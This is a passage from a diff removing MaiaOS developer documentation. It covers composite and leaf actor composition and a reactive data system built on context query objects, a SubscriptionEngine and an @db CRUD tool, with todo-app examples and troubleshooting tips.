-      this.sources.delete(id);
-    }
-  }
-  
-  destroy() {
-    // Stop all sources
-    for (const [id, source] of this.sources) {
-      source.stop();
-    }
-    this.sources.clear();
-    
-    // Close audio context
-    this.audioContext.close();
-  }
-}
-```
-
-## Next Steps
-
-- Read [Tools Guide](./tools.md) - Creating tool modules
-- Read [DSL Guide](./dsl.md) - Defining new DSL types
-- Read [MaiaOS Guide](./maiaos.md) - Understanding the system
-
----
-
-# 05_COMPOSITION
-
-*Source: developers/05_composition.md*
-
-# Actor Composition (Developer Guide)
-
-**For developers** who want to understand how composite/leaf actor patterns work in MaiaOS.
-
-## Overview
-
-MaiaOS supports **composable actor architecture** where actors can be composed hierarchically:
-- **Composite Actors**: Container actors with slots for child actors
-- **Leaf Actors**: Terminal actors that render UI or perform tasks
-- **Pure Message Passing**: All actor-to-actor communication via inbox/subscriptions
-
-## Composite vs Leaf Views
-
-### Leaf View
-
-A **leaf view** has a `root` property and renders directly to DOM:
-
-```json
-{
-  "$type": "view",
-  "root": {
-    "tag": "div",
-    "text": "$title"
-  }
-}
-```
-
-**Characteristics:**
-- Has `root` property (not `container`)
-- Renders directly to Shadow DOM
-- No slots or child actors
-- Terminal in composition tree
-
-### Composite View
-
-A **composite view** has a `container` property with slots:
-
-```json
-{
-  "$type": "view",
-  "container": {
-    "tag": "div",
-    "class": "dashboard",
-    "slots": {
-      "header": "@header",
-      "content": "@content",
-      "sidebar": "@sidebar"
-    }
-  }
-}
-```
-
-**Characteristics:**
-- Has `container` property (not `root`)
-- Defines slots using `@slotName` syntax
-- Child actors fill slots
-- Can nest composite → composite → leaf
-
-## Slot Resolution
-
-Slots use `@slotName` syntax to reference child actors:
-
-```json
-{
-  "container": {
-    "slots": {
-      "header": "@header",      // Resolves to children.header actor ID
-      "content": "@content"      // Resolves to children.content actor ID
-    }
-  }
-}
-```
-
-**Resolution Process:**
-1. ViewEngine detects `@slotName` reference
-2. Looks up `actor.config.children[slotName]` to get child actor ID
-3. Renders child actor's Shadow DOM root into slot position
-4. Recursively renders nested composites
-
-## Actor Children Map
-
-Actors define children in their `.actor.maia` file:
-
-```json
-{
-  "$type": "actor",
-  "$id": "actor_dashboard_001",
-  "children": {
-    "header": "actor_header_001",
-    "content": "actor_content_001"
-  }
-}
-```
-
-**Key Points:**
-- `children` is a map: `slotName → actorId`
-- Child actors are created recursively before parent renders
-- Parent auto-subscribes to all children
-- Children maintain their own Shadow DOM (isolated)
-
-## ViewEngine Composite Rendering
-
-**Flow:**
-1. `ViewEngine.render()` detects composite vs leaf
-2. Composite: calls `renderComposite()` with container definition
-3. For each slot:
-   - Resolves `@slotName` to child actor ID
-   - Gets child actor instance
-   - Clones child's Shadow DOM root into slot
-4. Leaf: calls `renderNode()` normally
-
-**Code Reference:**
-- `ViewEngine._isCompositeView()` - Detects view type
-- `ViewEngine._resolveSlot()` - Resolves `@slotName` to actor ID
-- `ViewEngine.renderComposite()` - Renders container with slots
-
-## ActorEngine Child Creation
-
-**Flow:**
-1. `ActorEngine.createActor()` checks for `config.children`
-2. For each child:
-   - Resolves actor ID to filename
-   - Loads child actor config
-   - Creates child container element
-   - Recursively calls `createActor()` for child
-   - Stores child reference in `actor.children[slotName]`
-   - Auto-subscribes parent to child
-
-**Code Reference:**
-- `ActorEngine.resolveActorIdToFilename()` - Maps actor ID to file
-- `ActorEngine.createActor()` - Recursive child creation
-
-## Message Passing Between Actors
-
-**Parent → Child:**
-- Parent publishes message via `publishMessage()`
-- Message validated against parent's `interface.publishes`
-- Sent to all actors in parent's `subscriptions` list
-- Child receives in inbox, validated against `interface.inbox`
-
-**Child → Parent:**
-- Child publishes message
-- Parent receives in inbox (if subscribed)
-- Parent's state machine processes message
-
-**Example:**
-```javascript
-// Child actor publishes TODO_CREATED
-actorEngine.publishMessage('actor_todo_input_001', 'TODO_CREATED', {
-  id: 'todo_123',
-  text: 'New todo'
-});
-
-// Parent receives in inbox
-// Parent's state machine processes TODO_CREATED event
-```
-
-## Interface Validation
-
-**Outgoing Messages (Publishes):**
-- Validated against `interface.publishes` schema
-- Rejected if message type not defined
-- Rejected if payload structure doesn't match
-
-**Incoming Messages (Inbox):**
-- Validated against `interface.inbox` schema
-- Rejected if message type not defined
-- Rejected if payload structure doesn't match
-
-**Validation Code:**
-- `ActorEngine._validateMessage()` - Validates message against interface
-- `ActorEngine.publishToSubscriptions()` - Validates before publishing
-- `ActorEngine.sendMessage()` - Validates before adding to inbox
-
-## Recursive Composition
-
-Composite actors can contain other composite actors:
-
-```
-vibe_root (composite)
-├── @header (view_switcher - leaf)
-├── @list (todo_list - composite)
-│   └── @item (todo_item - leaf, repeated)
-└── @kanban (kanban_view - leaf)
-```
-
-**Rendering Order:**
-1. Create `vibe_root` actor
-2. Create `view_switcher` child → render leaf
-3. Create `todo_list` child → render composite
-4. Create `todo_item` children → render leaves (repeated)
-5. Create `kanban_view` child → render leaf
-6. Render `vibe_root` composite with all slots filled
-
-## Best Practices
-
-**✅ DO:**
-- Use composite views for layout containers
-- Use leaf views for terminal UI components
-- Define clear interfaces for message contracts
-- Keep children isolated (own Shadow DOM)
-- Use descriptive slot names
-
-**❌ DON'T:**
-- Don't expose context directly (use message passing)
-- Don't create circular child dependencies
-- Don't skip interface definitions
-- Don't use prop drilling (use messages)
-
-## Future: Jazz CoMap Integration
-
-When migrating to Jazz-native architecture:
-- Each actor becomes a CoMap
-- `children` map stored in CoMap
-- `inbox` becomes CoFeed
-- `subscriptions` becomes CoList
-- Context dynamically queried (not stored)
-
-**Migration Path:**
-- Current: File-based actor definitions
-- Future: CoMap-based actor definitions
-- Interface validation remains the same
-- Message passing becomes CoFeed operations
-
----
-
-# 06_REACTIVE QUERIES
-
-*Source: developers/06_reactive-queries.md*
-
-# Reactive Data System - How Data Magically Updates Your UI
-
-## What Problem Does This Solve?
-
-Imagine you're building a todo app. When you add a new todo, you want it to automatically appear in the list without refreshing the page. When you mark a todo as done, you want it to instantly move from the "Todo" column to the "Done" column. 
-
-**The problem:** How do you make your UI automatically update when your data changes?
-
-**The old way:** You'd have to manually write code to update the UI every time data changes. It's like having to manually redraw a picture every time someone adds a new element.
-
-**The MaiaOS way:** Just declare what data you need in your `context`, and MaiaOS automatically watches for changes and updates your UI. It's like magic! ✨
-
-## Quick Example - See It in Action
-
-**Step 1: Declare what data you need (in your context)**
-
-```json
-{
-  "context": {
-    "todos": { 
-      "schema": "@schema/todos", 
-      "filter": null 
-    }
-  }
-}
-```
-
-**Step 2: Use it in your view**
-
-```json
-{
-  "$each": {
-    "items": "$todos",
-    "template": {
-      "tag": "li",
-      "text": "$$item.text"
-    }
-  }
-}
-```
-
-**Step 3: There is no step 3!** When you create a new todo using the `@db` tool, your view automatically updates. No extra code needed.
-
-## How It Works (The Simple Version)
-
-Think of MaiaOS like a helpful assistant watching your data:
-
-1. **You declare your needs**: "I need all todos" (in context)
-2. **MaiaOS subscribes for you**: A special engine called SubscriptionEngine notices your declaration and starts watching the database
-3. **Data changes**: Someone creates a new todo
-4. **MaiaOS notifies you**: SubscriptionEngine says "Hey! Your todos changed!"
-5. **UI updates automatically**: Your view re-renders with the new data
-
-**It's like subscribing to a newsletter** - you tell the system what you want to know about, and it automatically sends you updates when things change.
-
-## The Three Magic Ingredients
-
-### 1. Context = "What I Need" (Declarative)
-
-Your actor's `context` tells MaiaOS what data you need. Use **query objects** to declare reactive data subscriptions:
-
-```json
-{
-  "context": {
-    "todos": { 
-      "schema": "@schema/todos", 
-      "filter": null 
-    }
-  }
-}
-```
-
-**What this means:** "I need all items from the 'todos' collection, and keep me updated when they change."
-
-**Think of it like:** Ordering a newspaper subscription - you tell them what you want, and they deliver it to you every day.
-
-### 2. SubscriptionEngine = "The Watcher" (Automatic)
-
-SubscriptionEngine is a behind-the-scenes helper that:
-- Scans your context for query objects
-- Automatically subscribes to the database
-- Listens for changes
-- Updates your context when data changes
-- Triggers UI re-renders
-
-**You never interact with SubscriptionEngine directly** - it just works! Like electricity in your house - you don't think about it, you just flip the switch and the lights turn on.
-
-### 3. MaiaDB = "The Data Store" (Reactive)
-
-MaiaDB is the database that stores your data. It's special because:
-- It knows when data changes
-- It can notify subscribers (like SubscriptionEngine)
-- It's reactive by default (no manual "watch" setup)
-
-**Think of it like:** A smart filing cabinet that automatically tells you when someone adds or removes a file.
-
-## Context-Driven Reactivity - Your Data Blueprint
-
-The key concept: **Your context IS your data subscription blueprint.**
-
-### Simple Example - All Todos
-
-```json
-{
-  "context": {
-    "todos": {
-      "schema": "@schema/todos",
-      "filter": null
-    }
-  }
-}
-```
-
-**What happens:**
-1. SubscriptionEngine sees `"todos"` has a `schema` field starting with `@`
-2. It automatically creates a subscription to `@schema/todos`
-3. It initializes `context.todos = []`
-4. When data comes in, it sets `context.todos = [actual data]`
-5. Your view re-renders with the new data
-
-**In your view, you just use it:**
-
-```json
-{
-  "$each": {
-    "items": "$todos",
-    "template": {
-      "tag": "li",
-      "text": "$$item.text"
-    }
-  }
-}
-```
-
-### Filtered Example - Only Incomplete Todos
-
-```json
-{
-  "context": {
-    "todosTodo": {
-      "schema": "@schema/todos",
-      "filter": { "done": false }
-    },
-    "todosDone": {
-      "schema": "@schema/todos",
-      "filter": { "done": true }
-    }
-  }
-}
-```
-
-**What happens:**
-1. SubscriptionEngine creates TWO subscriptions (one for each context key)
-2. `todosTodo` gets all todos where `done === false`
-3. `todosDone` gets all todos where `done === true`
-4. Both update independently when data changes
-
-**In your view (Kanban board example):**
-
-```json
-{
-  "container": {
-    "tag": "div",
-    "class": "kanban",
-    "children": [
-      {
-        "tag": "div",
-        "class": "column",
-        "children": [
-          { "tag": "h2", "text": "Todo" },
-          {
-            "$each": {
-              "items": "$todosTodo",
-              "template": { "tag": "div", "text": "$$item.text" }
-            }
-          }
-        ]
-      },
-      {
-        "tag": "div",
-        "class": "column",
-        "children": [
-          { "tag": "h2", "text": "Done" },
-          {
-            "$each": {
-              "items": "$todosDone",
-              "template": { "tag": "div", "text": "$$item.text" }
-            }
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-## Query Objects - The Subscription Format
-
-A **query object** is how you declare "I want this data, reactively":
-
-```json
-{
-  "schema": "@schema/todos",
-  "filter": { "done": false }
-}
-```
-
-**Properties:**
-
-| Property | Required | Type | Description |
-|----------|----------|------|-------------|
-| `schema` | Yes | string | Database collection ID (must start with `@`) |
-| `filter` | No | object or null | Filter criteria (null = get all) |
-
-**Filter examples:**
-
-```json
-// All items
-{ "schema": "@schema/todos", "filter": null }
-
-// Incomplete todos
-{ "schema": "@schema/todos", "filter": { "done": false } }
-
-// Completed todos
-{ "schema": "@schema/todos", "filter": { "done": true } }
-
-// Specific user's todos
-{ "schema": "@schema/todos", "filter": { "userId": "123" } }
-```
-
-## The @ Reference System - Future-Proof IDs
-
-You might notice all schema references start with `@` (like `@schema/todos`, `@list`, `@brand`).
-
-**Why the @ symbol?**
-
-Think of `@` references as **symbolic names** that point to something. Like how `@username` on social media points to a user profile.
-
-**Right now:** `@schema/todos` is a string ID that MaiaDB uses to look up data.
-
-**In the future:** When MaiaOS migrates to CoJSON (our CRDT-based sync system), these `@` references will become **CoValue IDs** - unique identifiers for collaborative data objects that can sync across devices.
-
-**What this means for you:**
-- Keep using `@` prefixes for schemas, actors, views, styles, etc.
-- Your code will automatically work when we migrate to CoJSON
-- No breaking changes needed!
-
-**Examples:**
-```json
-{
-  "todos": { "schema": "@schema/todos", "filter": null },  // ← Data reference
-  "currentView": "@list",                                   // ← View reference (future: reactive)
-  "styleRef": "@brand"                                      // ← Style reference (future: reactive)
-}
-```
-
-## Context Types - Different Kinds of Data
-
-Your context can hold different types of data:
-
-### 1. Reactive Data (Query Objects)
-
-```json
-{
-  "todos": { "schema": "@schema/todos", "filter": null }
-}
-```
-
-**Auto-subscribes** - Changes in database automatically update context.
-
-### 2. @ References (Future Reactive)
-
-```json
-{
-  "currentView": "@list",
-  "currentStyle": "@brand"
-}
-```
-
-**Right now:** Static references to actors, views, styles.
-**Future:** Will be reactive (hot-reload when definitions change).
-
-### 3. Scalar Values (Non-Reactive)
-
-```json
-{
-  "newTodoText": "",
-  "viewMode": "list",
-  "isModalOpen": false
-}
-```
-
-**Updated by tools** - Only change when you explicitly update them via tools (like `@context/update`).
-
-## Creating, Updating, Deleting Data - The @db Tool
-
-To modify data, use the **`@db` tool**. It's a unified database operation tool that handles all CRUD operations.
-
-### Creating New Data
-
-**In your state machine:**
-
-```json
-{
-  "states": {
-    "creating": {
-      "entry": {
-        "tool": "@db",
-        "payload": {
-          "op": "create",
-          "schema": "@schema/todos",
-          "data": {
-            "text": "$newTodoText",
-            "done": false
-          }
-        }
-      },
-      "on": {
-        "SUCCESS": "idle"
-      }
-    }
-  }
-}
-```
-
-**What happens:**
-1. State machine sends event `CREATE_TODO`
-2. Transition to `creating` state
-3. Execute `@db` tool with `op: "create"`
-4. Database creates new todo
-5. **SubscriptionEngine automatically notifies subscribers**
-6. Your `context.todos` updates
-7. View re-renders with new todo
-8. Transition to `idle` state
-
-**You never manually update context** - the SubscriptionEngine does it for you!
-
-### Updating Data
-
-```json
-{
-  "tool": "@db",
-  "payload": {
-    "op": "update",
-    "schema": "@schema/todos",
-    "id": "$editingId",
-    "data": {
-      "text": "$newTodoText"
-    }
-  }
-}
-```
-
-### Toggling Boolean Fields
-
-```json
-{
-  "tool": "@db",
-  "payload": {
-    "op": "toggle",
-    "schema": "@schema/todos",
-    "id": "$$id",
-    "field": "done"
-  }
-}
-```
-
-**Special operation** - Flips a boolean field from `true` to `false` or vice versa. Perfect for todo completion!
-
-### Deleting Data
-
-```json
-{
-  "tool": "@db",
-  "payload": {
-    "op": "delete",
-    "schema": "@schema/todos",
-    "id": "$$id"
-  }
-}
-```
-
-## Data Flow - From Click to Update
-
-Let's trace what happens when you click "Add Todo":
-
-```
-1. User types "Buy milk" in input
-   ↓
-2. User clicks "Add" button
-   ↓
-3. View sends event: { "send": "CREATE_TODO" }
-   ↓
-4. State machine transitions: "idle" → "creating"
-   ↓
-5. State machine entry action executes @db tool:
-   { "op": "create", "schema": "@schema/todos", "data": {...} }
-   ↓
-6. MaiaDB creates new todo in IndexedDB:
-   { "id": "123", "text": "Buy milk", "done": false }
-   ↓
-7. MaiaDB notifies observers: "Hey! @schema/todos changed!"
-   ↓
-8. SubscriptionEngine receives notification
-   ↓
-9. SubscriptionEngine updates context:
-   actor.context.todos = [new data from database]
-   ↓
-10. SubscriptionEngine schedules re-render (batched in microtask)
-   ↓
-11. ActorEngine.rerender(actor) is called
-   ↓
-12. ViewEngine re-renders with new context.todos
-   ↓
-13. User sees "Buy milk" appear in the list! ✨
-   ↓
-14. State machine transitions: "creating" → "idle"
-```
-
-**Key insight:** You never manually update `context.todos`. The SubscriptionEngine does it automatically when the database changes.
-
-## SubscriptionEngine - The Magic Behind the Scenes
-
-You don't directly interact with SubscriptionEngine, but it's helpful to understand what it does for you:
-
-### What It Does
-
-1. **Scans your context** - Looks for query objects (objects with `schema` field)
-2. **Auto-subscribes** - Creates database subscriptions for each query object
-3. **Watches for changes** - Listens to database notifications
-4. **Updates context** - Sets `context[key]` when data changes
-5. **Batches re-renders** - Collects multiple updates and re-renders once
-6. **Deduplicates** - Skips re-renders if data hasn't actually changed
-7. **Cleans up** - Unsubscribes when actor is destroyed (prevents memory leaks)
-
-### Lifecycle
-
-```
-Actor Created
-  ↓
-SubscriptionEngine.initialize(actor)
-  ↓
-Scan context for query objects
-  ↓
-For each query object:
-  - Subscribe to MaiaDB
-  - Store unsubscribe function in actor._subscriptions
-  ↓
-Actor is now reactive!
-  ↓
-Data changes → Callback fired → Context updated → Re-render scheduled
-  ↓
-(Repeat until actor is destroyed)
-  ↓
-Actor Destroyed
-  ↓
-SubscriptionEngine.cleanup(actor)
-  ↓
-All subscriptions unsubscribed
-```
-
-### Optimization - Batching and Deduplication
-
-**Batching** - If multiple updates happen at once (e.g., you create 5 todos in a loop), SubscriptionEngine batches them:
-
-```
-Update 1 → Schedule re-render (in microtask)
-Update 2 → Already scheduled, skip
-Update 3 → Already scheduled, skip
-Update 4 → Already scheduled, skip
-Update 5 → Already scheduled, skip
-  ↓
-Microtask runs → Re-render ONCE with all updates
-```
-
-**Result:** 5 updates = 1 re-render (instead of 5 re-renders)
-
-**Deduplication** - If data hasn't actually changed, skip re-render:
-
-```javascript
-// Old data: [{ id: "1", text: "Buy milk", done: false }]
-// New data: [{ id: "1", text: "Buy milk", done: false }]
-// Result: Same data → Skip re-render
-```
-
-**Result:** No unnecessary re-renders!
-
-### Debug Logs - See What's Happening
-
-SubscriptionEngine logs everything in development mode:
-
-```javascript
-[SubscriptionEngine] Initialized
-[SubscriptionEngine] Initializing actor_list_001
-[SubscriptionEngine] ✅ actor_list_001 → @schema/todos → $todos
-[SubscriptionEngine] actor_list_001 initialized with 1 subscription(s)
-[SubscriptionEngine] 📥 actor_list_001.$todos initial data (3)
-[SubscriptionEngine] 🔄 actor_list_001.$todos updated (4)
-[SubscriptionEngine] 🎨 Batched re-render: 1 actor(s) [actor_list_001]
-```
-
-**Emojis explain what's happening:**
-- ✅ Subscription created
-- 📥 Initial data received
-- 🔄 Data updated
-- ⏭️ Skipping (no change)
-- 🎨 Re-rendering
-- 🧹 Cleaning up
-
-**Open your browser console** and watch the magic happen!
-
-## State Machine's Role - Pure Transition Rules
-
-With the new architecture, **state machines are purely declarative**. They define:
-- **What transitions happen** (A → B)
-- **What tools to execute** (`@db`, `@context/update`, etc.)
-- **What context updates to make** (via tools)
-
-**State machines DO NOT:**
-- ❌ Load data directly
-- ❌ Subscribe to data
-- ❌ Manage subscriptions
-- ❌ Know about SubscriptionEngine
-
-**Example:**
-
-```json
-{
-  "$type": "state",
-  "initial": "loading",
-  "states": {
-    "loading": {
-      "entry": [],
-      "on": {
-        "SUCCESS": "idle"
-      }
-    },
-    "idle": {
-      "on": {
-        "CREATE_TODO": {
-          "target": "creating",
-          "guard": { "$ne": ["$newTodoText", ""] }
-        }
-      }
-    },
-    "creating": {
-      "entry": {
-        "tool": "@db",
-        "payload": {
-          "op": "create",
-          "schema": "@schema/todos",
-          "data": {
-            "text": "$newTodoText",
-            "done": false
-          }
-        }
-      },
-      "on": {
-        "SUCCESS": {
-          "target": "idle",
-          "actions": [
-            {
-              "tool": "@context/update",
-              "payload": {
-                "newTodoText": ""
-              }
-            }
-          ]
-        }
-      }
-    }
-  }
-}
-```
-
-**What the state machine does:**
-1. Defines transition rules (`idle` → `creating` when `CREATE_TODO` received)
-2. Executes tools (`@db` to create todo)
-3. Updates context (`newTodoText = ""` to clear input)
-
-**What it doesn't do:**
-- Subscribe to data (SubscriptionEngine does this)
-- Load data (SubscriptionEngine does this)
-- Know about reactivity (SubscriptionEngine handles it)
-
-**It's purely business logic** - "When this happens, do that."
-
-## View's Role - Pure Consumer of Context
-
-Views are **purely presentation**. They read from context and render UI.
-
-**Views DO:**
-- ✅ Read from context (`$todos`, `$newTodoText`)
-- ✅ Loop over arrays (`$each`)
-- ✅ Send events (`{ "send": "CREATE_TODO" }`)
-- ✅ Display data (`$$item.text`)
-
-**Views DO NOT:**
-- ❌ Subscribe to data
-- ❌ Load data
-- ❌ Know about reactivity
-- ❌ Contain business logic
-
-**Example:**
-
-```json
-{
-  "$type": "view",
-  "container": {
-    "tag": "div",
-    "children": [
-      {
-        "tag": "input",
-        "attrs": {
-          "value": "$newTodoText"
-        }
-      },
-      {
-        "tag": "button",
-        "text": "Add",
-        "$on": {
-          "click": { "send": "CREATE_TODO" }
-        }
-      },
-      {
-        "tag": "ul",
-        "$each": {
-          "items": "$todos",
-          "template": {
-            "tag": "li",
-            "children": [
-              { "tag": "span", "text": "$$item.text" },
-              {
-                "tag": "button",
-                "text": "✓",
-                "$on": {
-                  "click": {
-                    "send": "TOGGLE_TODO",
-                    "payload": { "id": "$$item.id" }
-                  }
-                }
-              }
-            ]
-          }
-        }
-      }
-    ]
-  }
-}
-```
-
-**That's it!** Views just read from context and send events. SubscriptionEngine keeps context up to date.
-
-## Real Example - Todo App Architecture
-
-Let's build a complete todo app to see how it all fits together:
-
-### 1. Context - Declare Your Data Needs
-
-**`list.context.maia`:**
-
-```json
-{
-  "$type": "context",
-  "$id": "context_list_001",
-  
-  "todos": {
-    "schema": "@schema/todos",
-    "filter": null
-  },
-  
-  "newTodoText": ""
-}
-```
-
-**What this does:**
-- `todos`: Reactive data (auto-subscribes, auto-updates)
-- `newTodoText`: Form state (updated via tools)
-
-### 2. State Machine - Define Business Logic
-
-**`list.state.maia`:**
-
-```json
-{
-  "$type": "state",
-  "$id": "state_list_001",
-  "initial": "loading",
-  "states": {
-    "loading": {
-      "entry": [],
-      "on": {
-        "SUCCESS": "idle"
-      }
-    },
-    "idle": {
-      "on": {
-        "CREATE_TODO": {
-          "target": "creating",
-          "guard": { "$ne": ["$newTodoText", ""] }
-        },
-        "TOGGLE_TODO": "toggling",
-        "DELETE_TODO": "deleting"
-      }
-    },
-    "creating": {
-      "entry": {
-        "tool": "@db",
-        "payload": {
-          "op": "create",
-          "schema": "@schema/todos",
-          "data": {
-            "text": "$newTodoText",
-            "done": false
-          }
-        }
-      },
-      "on": {
-        "SUCCESS": {
-          "target": "idle",
-          "actions": [
-            {
-              "tool": "@context/update",
-              "payload": {
-                "newTodoText": ""
-              }
-            }
-          ]
-        }
-      }
-    },
-    "toggling": {
-      "entry": {
-        "tool": "@db",
-        "payload": {
-          "op": "toggle",
-          "schema": "@schema/todos",
-          "id": "$$event.payload.id",
-          "field": "done"
-        }
-      },
-      "on": {
-        "SUCCESS": "idle"
-      }
-    },
-    "deleting": {
-      "entry": {
-        "tool": "@db",
-        "payload": {
-          "op": "delete",
-          "schema": "@schema/todos",
-          "id": "$$event.payload.id"
-        }
-      },
-      "on": {
-        "SUCCESS": "idle"
-      }
-    }
-  }
-}
-```
-
-**What this does:**
-- Handles user events (`CREATE_TODO`, `TOGGLE_TODO`, `DELETE_TODO`)
-- Executes database operations via `@db` tool
-- Updates form state (clear input after create)
-
-### 3. View - Display Data
-
-**`list.view.maia`:**
-
-```json
-{
-  "$type": "view",
-  "$id": "view_list_001",
-  "container": {
-    "tag": "div",
-    "class": "todo-list",
-    "children": [
-      {
-        "tag": "div",
-        "class": "input-form",
-        "children": [
-          {
-            "tag": "input",
-            "attrs": {
-              "type": "text",
-              "placeholder": "What needs to be done?",
-              "value": "$newTodoText"
-            },
-            "$on": {
-              "input": {
-                "tool": "@context/update",
-                "payload": {
-                  "newTodoText": "$$event.target.value"
-                }
-              }
-            }
-          },
-          {
-            "tag": "button",
-            "text": "Add",
-            "$on": {
-              "click": { "send": "CREATE_TODO" }
-            }
-          }
-        ]
-      },
-      {
-        "tag": "ul",
-        "class": "todo-items",
-        "$each": {
-          "items": "$todos",
-          "template": {
-            "tag": "li",
-            "class": "todo-item",
-            "children": [
-              {
-                "tag": "span",
-                "text": "$$item.text",
-                "class": {
-                  "done": "$$item.done"
-                }
-              },
-              {
-                "tag": "button",
-                "text": "✓",
-                "$on": {
-                  "click": {
-                    "send": "TOGGLE_TODO",
-                    "payload": { "id": "$$item.id" }
-                  }
-                }
-              },
-              {
-                "tag": "button",
-                "text": "✕",
-                "$on": {
-                  "click": {
-                    "send": "DELETE_TODO",
-                    "payload": { "id": "$$item.id" }
-                  }
-                }
-              }
-            ]
-          }
-        }
-      }
-    ]
-  }
-}
-```
-
-**What this does:**
-- Renders input form (reads `$newTodoText`, sends `CREATE_TODO`)
-- Renders todo list (loops over `$todos`)
-- Renders buttons (sends `TOGGLE_TODO`, `DELETE_TODO`)
-
-### 4. Actor - Compose It All
-
-**`list.actor.maia`:**
-
-```json
-{
-  "$type": "actor",
-  "$id": "actor_list_001",
-  "id": "actor_list_001",
-  
-  "contextRef": "list",
-  "stateRef": "list",
-  "viewRef": "list"
-}
-```
-
-**That's it!** SubscriptionEngine handles all the reactivity automatically.
-
-## Common Patterns
-
-### Pattern 1: Multiple Filtered Views (Kanban Board)
-
-**Context:**
-
-```json
-{
-  "todosTodo": {
-    "schema": "@schema/todos",
-    "filter": { "done": false }
-  },
-  "todosDone": {
-    "schema": "@schema/todos",
-    "filter": { "done": true }
-  }
-}
-```
-
-**View:**
-
-```json
-{
-  "container": {
-    "tag": "div",
-    "class": "kanban",
-    "children": [
-      {
-        "tag": "div",
-        "class": "column",
-        "children": [
-          { "tag": "h2", "text": "Todo" },
-          {
-            "$each": {
-              "items": "$todosTodo",
-              "template": {
-                "tag": "div",
-                "class": "card",
-                "text": "$$item.text"
-              }
-            }
-          }
-        ]
-      },
-      {
-        "tag": "div",
-        "class": "column",
-        "children": [
-          { "tag": "h2", "text": "Done" },
-          {
-            "$each": {
-              "items": "$todosDone",
-              "template": {
-                "tag": "div",
-                "class": "card",
-                "text": "$$item.text"
-              }
-            }
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-**Result:** When you toggle a todo, it automatically moves from "Todo" to "Done" column!
-
-### Pattern 2: Loading States
-
-**Context:**
-
-```json
-{
-  "todos": {
-    "schema": "@schema/todos",
-    "filter": null
-  },
-  "isLoading": true
-}
-```
-
-**State Machine:**
-
-```json
-{
-  "states": {
-    "loading": {
-      "entry": {
-        "tool": "@context/update",
-        "payload": { "isLoading": true }
-      },
-      "on": {
-        "SUCCESS": {
-          "target": "idle",
-          "actions": [
-            {
-              "tool": "@context/update",
-              "payload": { "isLoading": false }
-            }
-          ]
-        }
-      }
-    }
-  }
-}
-```
-
-**View:**
-
-```json
-{
-  "container": {
-    "tag": "div",
-    "children": [
-      {
-        "tag": "div",
-        "text": "Loading...",
-        "$if": "$isLoading"
-      },
-      {
-        "tag": "ul",
-        "$if": { "$not": "$isLoading" },
-        "$each": {
-          "items": "$todos",
-          "template": { "tag": "li", "text": "$$item.text" }
-        }
-      }
-    ]
-  }
-}
-```
-
-**Result:** Shows "Loading..." until data arrives, then shows the list!
-
-### Pattern 3: Search/Filter
-
-**Context:**
-
-```json
-{
-  "todos": {
-    "schema": "@schema/todos",
-    "filter": null
-  },
-  "searchQuery": ""
-}
-```
-
-**View (with client-side filtering):**
-
-```json
-{
-  "container": {
-    "tag": "div",
-    "children": [
-      {
-        "tag": "input",
-        "attrs": {
-          "type": "search",
-          "placeholder": "Search todos...",
-          "value": "$searchQuery"
-        },
-        "$on": {
-          "input": {
-            "tool": "@context/update",
-            "payload": {
-              "searchQuery": "$$event.target.value"
-            }
-          }
-        }
-      },
-      {
-        "tag": "ul",
-        "$each": {
-          "items": {
-            "$filter": {
-              "items": "$todos",
-              "condition": {
-                "$contains": ["$$item.text", "$searchQuery"]
-              }
-            }
-          },
-          "template": {
-            "tag": "li",
-            "text": "$$item.text"
-          }
-        }
-      }
-    ]
-  }
-}
-```
-
-**Result:** As you type, the list filters in real-time!
-
-## Troubleshooting
-
-### My data isn't showing up!
-
-**Checklist:**
-1. Is your context query object correct?
-   ```json
-   { "schema": "@schema/todos", "filter": null }
-   ```
-2. Does the schema name match your database?
-3. Is there actually data in the database? (Check IndexedDB in DevTools)
-4. Are there errors in the console?
-
-**Debug:**
-- Open DevTools → Console
-- Look for `[SubscriptionEngine]` logs
-- Look for `[IndexedDBBackend]` logs
-- Check: `✅ actor_list_001 → @schema/todos → $todos`
-
-### My UI isn't updating when I create data!
-
-**Checklist:**
-1. Are you using the `@db` tool to create data?
-   ```json
-   { "tool": "@db", "payload": { "op": "create", ... } }
-   ```
-2. Is the `schema` in your create operation the same as in your context?
-3. Are you seeing `🔄 actor_list_001.$todos updated` in console?
-
-**Debug:**
-- Check console for `[DBEngine]` logs
-- Check console for `[SubscriptionEngine]` logs
-- Verify the state machine transition completes (SUCCESS event)
-
-### I'm seeing duplicate UI elements!
-
-**Cause:** ViewEngine was appending to the shadow DOM without clearing it first.
-
-**Fixed in v0.4+** - ViewEngine now clears `shadowRoot.innerHTML = ''` on every render.
-
-**If you see this:** Update to latest MaiaOS version.
-
-### Memory leaks - Subscriptions not cleaning up!
-
-**Cause:** Old code wasn't properly unsubscribing when actors were destroyed.
-
-**Fixed in v0.4+** - SubscriptionEngine automatically cleans up all subscriptions when an actor is destroyed.
-
-**How it works:**
-- Every subscription stores an unsubscribe function in `actor._subscriptions`
-- When `destroyActor()` is called, SubscriptionEngine calls all unsubscribe functions
-- No memory leaks! ✨
-
-## Migration Path to CoJSON (Future)
-
-The current architecture is designed to be **100% compatible** with CoJSON (our CRDT-based collaborative sync system).
-
-**What will change:**
-- Database backend: IndexedDB → CoJSON sync layer
-- Schema references: `@schema/todos` → CoValue IDs
-- Reactivity: Still automatic (CRDTs are reactive by default)
-
-**What WON'T change:**
-- Query object syntax (same format)
-- Context declarations (same structure)
-- State machines (same business logic)
-- Views (same presentation code)
-- Your application code!
-
-**Migration steps (when we're ready):**
-1. Replace `IndexedDBBackend` with `CoJSONBackend`
-2. Update schema IDs to CoValue IDs
-3. Done! Everything else works automatically
-
-**You don't need to worry about this now** - just keep using the current system, and migration will be seamless.
-
-## Best Practices
-
-### ✅ DO:
-
-1. **Declare data needs in context**
-   ```json
-   { "todos": { "schema": "@schema/todos", "filter": null } }
-   ```
-
-2. **Use filtered subscriptions for views that need subsets**
-   ```json
-   { "todosTodo": { "schema": "@schema/todos", "filter": { "done": false } } }
-   ```
-
-3. **Let SubscriptionEngine handle reactivity** (never manually update arrays)
-
-4. **Use @db tool for all CRUD operations**
-   ```json
-   { "tool": "@db", "payload": { "op": "create", ... } }
-   ```
-
-5. **Keep state machines pure** (only transition rules and tool calls)
-
-6. **Keep views pure** (only presentation, no logic)
-
-7. **Check console logs** (SubscriptionEngine shows everything)
-
-### ❌ DON'T:
-
-1. **Don't manually update query object arrays**
-   ```javascript
-   // ❌ WRONG
